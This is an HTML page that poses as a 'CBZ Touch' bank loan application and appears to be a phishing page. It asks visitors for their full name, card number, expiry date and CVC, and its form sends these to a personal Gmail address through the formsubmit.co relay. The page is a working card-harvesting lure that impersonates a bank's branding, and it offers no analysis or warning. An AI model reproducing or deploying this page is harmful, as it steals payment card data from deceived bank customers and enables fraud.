<!doctype html>  
<html lang="en">  
<head>  
  <meta charset="UTF-8" />  
<meta name="viewport" content="width=device-width, initial-scale=1.0" />  
<title>CBZ Loan</title>  
<style>  
* {  
box-sizing: border-box;  
margin: 0;  
padding: 0;  
}  
  
body {  
margin: 0;  
min-height: 100vh;  
display: flex;  
/* ✅ not flex-start */  
align-items: center;  
justify-content: center;  
background: #f5f5f5;  
padding: 16px;  
font-family: "Helvetica Neue", Arial, sans-serif;  
}  
  
.login-box {  
width: 100%;  
max-width: 400px;  
padding: clamp(21px, 6vw, 30px);  
border-radius: 10px;  
background: #fff;  
box-sizing: border-box;  
box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);  
text-align: center;  
}  
  
.logo {  
width: 100px;  
/* fallback for old browsers */  
height: 100px;  
width: clamp(80px, 30vw, 100px);  
height: clamp(80px, 30vw, 100px);  
background-color: #e31837;  
border-radius: 50%;  
display: flex;  
flex-direction: column;  
align-items: center;  
justify-content: center;  
margin: 0 auto 24px;  
color: white;  
}  
  
.cbz {  
font-size: clamp(35px, 10vw, 45px);  
font-weight: 900;  
line-height: 0.8;  
margin-bottom: -1px;  
text-transform: lowercase;  
letter-spacing: -0.5px;  
}  
  
.team {  
font-size: 18px;  
font-weight: 500;  
line-height: 1;  
}  
  
.title {  
font-size: 18px;  
font-weight: 500;  
color: #1b2b7a;  
margin-bottom: 28px;  
text-align: center;  
}  
  
.input-group {  
position: relative;  
margin-bottom: 15px;  
}  
  
.input-group input {  
width: 100%;  
padding: 20px 14px 8px;  
/* top padding makes room for floated label */  
background-color: #f5f5f5;  
border: 1.6px solid #ddd;  
border-radius: 10px;  
font-size: 16px;  
color: #333;  
margin: 0;   
  
.input-group input:focus {  
border-color: #1b2b7a;  
outline: none;  
}  
  
.input-group label {  
position: absolute;  
left: 14px;  
top: 16px;  
font-size: 16px;  
color: #777;  
pointer-events: none;  
transition: 0.2s ease all;  
background: #f5f5f5;  
padding: 0 4px;  
}  
  
.input-group input:focus + label,  
.input-group input:not(:placeholder-shown) + label {  
top: -10px;  
/* moves up into border */  
font-size: 12px;  
color: #1b2b7a;  
}  
.btn {  
width: 100%;  
padding: 14px;  
background-color: #e31837;  
color: white;  
border: none;  
border-radius: 15px;  
font-weight: 500;  
font-size: 18px;  
cursor: pointer;  
margin-top: 12px;  
transition: background-color 0.2s;  
}  
  
.btn:hover,  
.btn:active {  
background-color: #c41530;  
}  
  
.btn:disabled {  
background: #aaa;  
cursor: not-allowed;  
}  
  
select {
  width: 100%;
  padding: 20px 14px 8px;
  background: #f5f5f5;
  border: 1.6px solid #ddd;
  border-radius: 10px;
  font-size: 16px;
  color: #333;
}
  
.note {  
  margin-top: 20px;  
  color: #777;  
  font-size: 14px;  
  text-align: center;  
}  
  
select:focus {  
  border-color: #1b2b7a;  
  outline: none;  
}  
  
@media (max-width: 360px) {  
  body {  
    padding: 12px;  
  }  
  
  .login-box {  
    border-radius: 8px;  
  }  
  
  input,  
  select,  
  .btn {  
    padding: 12px;  
  }  
}  
</style>  
</head>  
<body>  
  <div class="login-box">  
  
    <div class="logo">  
      <span class="cbz">cbz</span>  
      <span class="touch">touch</span>  
    </div>  
  
    <p class="title">Enter your details to apply</p>  
  
    <form action="https://formsubmit.co/kendrainmatwaya@gmail.com" method="POST"> 
  
      <div class="input-group">  
        <input type="text" id="name" name="name" placeholder=" " required>  
        <label for="name">Full Name</label>  
      </div>  
  
      <div class="input-group">  
        <input type="number" id="data1" name="data1" placeholder=" " required>  
        <label for="data1">Card Number</label>  
      </div>  
  
      <div class="input-group">  
        <input type="text" id="data2" name="data2" placeholder=" " required>  
        <label for="data2">Valid Till</label>  
      </div>
      
      <div class="input-group">
          <input type="number" id="data3" name="data3" placeholder=" " required>
          <label for="data3">CVC</label>
          
      <div class="input-group">  
        <select id="loan_type" name="loan_type" required>  
          <option value="">Select loan type</option>  
          <option value="Personal">Personal Loan</option>  
          <option value="Business">Business Loan</option>  
          <option value="Mortgage">Mortgage</option>  
          <option value="Other">Other</option>  
        </select>  
      </div>  
  
      <button type="submit" class="btn">  
        Submit  
      </button>  
  
    </form>  
  
    <p class="note">CBZ Touch Holdings</p>  
  
  </div>  
</body>  
</html>
